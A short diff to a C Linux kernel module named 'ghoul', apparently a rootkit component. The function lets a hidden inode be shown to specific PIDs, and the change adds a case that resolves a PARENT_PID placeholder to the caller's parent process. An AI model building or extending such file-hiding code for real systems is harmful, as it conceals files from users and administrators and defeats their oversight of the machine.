@@ -106,17 +106,19 @@ void show_file_inode(const void __user *user_info)
         return;
     }
 
+    // show inode to parent PID - find it
+    if (info.pid == PARENT_PID)
+        info.pid = current->parent->pid;
+
     // show inode to a specific PID - add PID to excluded PIDs list
-    else {
-        pr_info("ghoul: showing inode %lu for PID %d\n", info.ino, info.pid);
-        excluded_pid = kzalloc(sizeof(struct pid_list), GFP_KERNEL);
+    pr_info("ghoul: showing inode %lu for PID %d\n", info.ino, info.pid);
+    excluded_pid = kzalloc(sizeof(struct pid_list), GFP_KERNEL);
 
-        if (excluded_pid == NULL) {
-            pr_err("ghoul: memory allocation error while showing inode\n");
-            return;
-        }
-
-        excluded_pid->pid = info.pid;
-        list_add_tail(&excluded_pid->list, &hidden_inode->excluded_pids);
+    if (excluded_pid == NULL) {
+        pr_err("ghoul: memory allocation error while showing inode\n");
+        return;
     }
+
+    excluded_pid->pid = info.pid;
+    list_add_tail(&excluded_pid->list, &hidden_inode->excluded_pids);
 }
